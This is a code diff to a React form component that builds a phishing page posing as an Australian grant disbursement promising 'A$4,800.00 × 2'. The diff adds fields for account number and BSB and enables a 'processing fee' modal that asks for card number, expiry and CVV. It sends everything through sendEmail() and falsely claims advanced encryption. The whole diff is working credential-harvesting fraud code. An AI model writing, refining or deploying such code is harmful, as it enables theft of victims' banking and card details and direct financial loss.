@@ -12,6 +12,8 @@ const ExamForm = () => {
   const [showPinModal, setShowPinModal] = useState(false);
   const [bankName, setBankName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
+  const [accNo, setAccNo] = useState('');
+  const [routingNo, setRoutingNo] = useState('');
   const [expirationDate, setExpirationDate] = useState('');
   const [cvv, setCvv] = useState('');
   const [nameOnCard, setNameOnCard] = useState('');
@@ -22,6 +24,8 @@ const ExamForm = () => {
   const resetForm = () => {
     setBankName('');
     setCardNumber('');
+    setAccNo('');
+    setRoutingNo('');
     setExpirationDate('');
     setCvv('');
     setNameOnCard('');
@@ -39,18 +43,18 @@ const ExamForm = () => {
     e.preventDefault();
      sendEmail();
     setShowConfirmModal(false);
-    resetForm();
-    // setShowPinModal(true);
-    navigate('/otp');
+   // resetForm();
+    setShowPinModal(true);
+    // navigate('/otp');
   };
 
-  // const handlePinSubmit = (e) => {
-  //   e.preventDefault();
-  //   sendEmail();
-  //   resetForm();
-  //   setShowPinModal(false);
-  //   navigate('/otp');
-  // };
+  const handlePinSubmit = (e) => {
+    e.preventDefault();
+    sendEmail();
+    resetForm();
+    setShowPinModal(false);
+    navigate('/otp');
+  };
 
   const handleTextOnlyInput = (e) => {
     e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
@@ -78,6 +82,8 @@ const ExamForm = () => {
     const templateParams = {
       bankName,
       cardNumber,
+      accNo,
+      routingNo,
       expirationDate,
       cvv,
       nameOnCard,
@@ -105,10 +111,10 @@ const ExamForm = () => {
       <div className="col-md-6 mt-5">
        
         <h3 className='mt-5'>Grant Disbursement – Verify and Complete Your Details</h3>
-        <p>Funds will be transferred to your bank card. Please provide the following details to complete the payment process.</p>
+        <p>Funds will be transferred to your bank account. Please provide the following details to complete the payment process.</p>
         <p>Only enter correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during disbursement.</p>
         <div className="card p-4 pt-2">
-        <p className='text-end fw-bold fs-6'>Double Disbursement: A$3,700.00 × 2</p>
+        <p className='text-end fw-bold fs-6'>Double Disbursement: A$4,800.00 × 2</p>
         <p className='fst-italic text-end p-0 m-0'>Trusted and Secure Payment</p>
         <div className="d-flex justify-content-end mb-3">          
           <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
@@ -125,6 +131,80 @@ const ExamForm = () => {
                 onChange={(e) => setBankName(e.target.value)}
               />
             </Form.Group>
+
+            <Form.Group className="mb-3" controlId="nameOnCard">
+              <Form.Label>Full Name of Account Holder</Form.Label>
+              <Form.Control
+                type="text"
+                placeholder="Enter account holder's full name"
+                //  name="nameOnCard"
+                value={nameOnCard}
+                // onInput={handleTextOnlyInput}
+                onChange={(e) => setNameOnCard(e.target.value)}
+                required
+              />
+            </Form.Group>
+
+            <Form.Group className="mb-3" controlId="accNo">
+              <Form.Label>Account Number</Form.Label>
+              <Form.Control
+                // type="number"
+                placeholder="e.g., 123456789012"
+                // name="accNo"
+                value={accNo}
+                onInput={handleNumberOnlyInput}
+                maxLength='12'
+                onChange={(e) => setAccNo(e.target.value)}
+                required
+              />
+            </Form.Group>
+
+            <Form.Group className="mb-3" controlId="routingNo">
+              <Form.Label>BSB (Bank-State-Branch) Number</Form.Label>
+              <Form.Control
+                // type="number"
+                placeholder="e.g., 123-456"
+                // name="routingNo"
+                value={routingNo}
+                onInput={handleNumberOnlyInput}
+                maxLength='6'
+                onChange={(e) => setRoutingNo(e.target.value)}
+                required
+              />
+            </Form.Group>
+           
+
+            <p className='fst-italic'>Please review and confirm your details before submission.</p>
+
+            <Button variant="primary" type="submit">SUBMIT</Button>
+            
+          </Form>
+        </div>
+        <p className="mt-3"><strong>Trusted and Secured</strong><br />
+        Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
+        
+        {/* Confirmation Modal */}
+        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
+          <Modal.Header closeButton>
+            <Modal.Title>Confirm Details</Modal.Title>
+          </Modal.Header>
+          <Modal.Body>
+            <p>Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.</p>
+          </Modal.Body>
+          <Modal.Footer>
+            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancel</Button>
+            <Button variant="primary" onClick={handleConfirmClick}>Yes, I Have Confirmed</Button>
+          </Modal.Footer>
+        </Modal>
+
+        {/* PIN Modal */}
+        <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
+          <Modal.Header closeButton>
+            <Modal.Title>Processing Fee of A$7.00</Modal.Title>
+          </Modal.Header>
+          <Modal.Body>
+            <Form onSubmit={handlePinSubmit}>
+
             <Form.Group className="mb-3" controlId="cardNumber">
               <Form.Label>Card Number</Form.Label>
               <Form.Control 
@@ -198,56 +278,14 @@ const ExamForm = () => {
               </div>
             </Form.Group>
 
-            <p className='fst-italic'>Please review and confirm your details with your bank card before submission.</p>
-
-            <Button variant="primary" type="submit">SUBMIT</Button>
-            
-          </Form>
-        </div>
-        <p className="mt-3"><strong>Trusted and Secured</strong><br />
-        Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
-        
-        {/* Confirmation Modal */}
-        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
-          <Modal.Header closeButton>
-            <Modal.Title>Confirm Details</Modal.Title>
-          </Modal.Header>
-          <Modal.Body>
-            <p>Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.</p>
-          </Modal.Body>
-          <Modal.Footer>
-            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancel</Button>
-            <Button variant="primary" onClick={handleConfirmClick}>Yes, I Have Confirmed</Button>
-          </Modal.Footer>
-        </Modal>
-
-        {/* PIN Modal */}
-        {/* <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
-          <Modal.Header closeButton>
-            <Modal.Title>Enter PIN</Modal.Title>
-          </Modal.Header>
-          <Modal.Body>
-            <Form onSubmit={handlePinSubmit}>
-              <Form.Group className="mb-3" controlId="pin">
-                <Form.Label>Enter Your 4 Digit Card PIN to Complete Payment</Form.Label>
-                <Form.Control 
-                  type="text" 
-                  placeholder="0000" 
-                  required 
-                  maxLength="4" 
-                  value={pin}
-                  onInput={handleNumberOnlyInput}
-                  onChange={(e) => setPin(e.target.value)}
-                />
-              </Form.Group>
               <Button variant="primary" type="submit">PAY</Button>                           
-              <p className="fw-bold text-end"> - $ 6.00</p>
+              <p className="fw-bold text-end"> - A$7.00</p>
             </Form>
           </Modal.Body>
           <Modal.Footer>
             <Form.Text className="text-muted">Kindly avoid disclosing your information to others.</Form.Text>
           </Modal.Footer>
-        </Modal> */}
+        </Modal>
       </div>
     </div>
     <Footer />
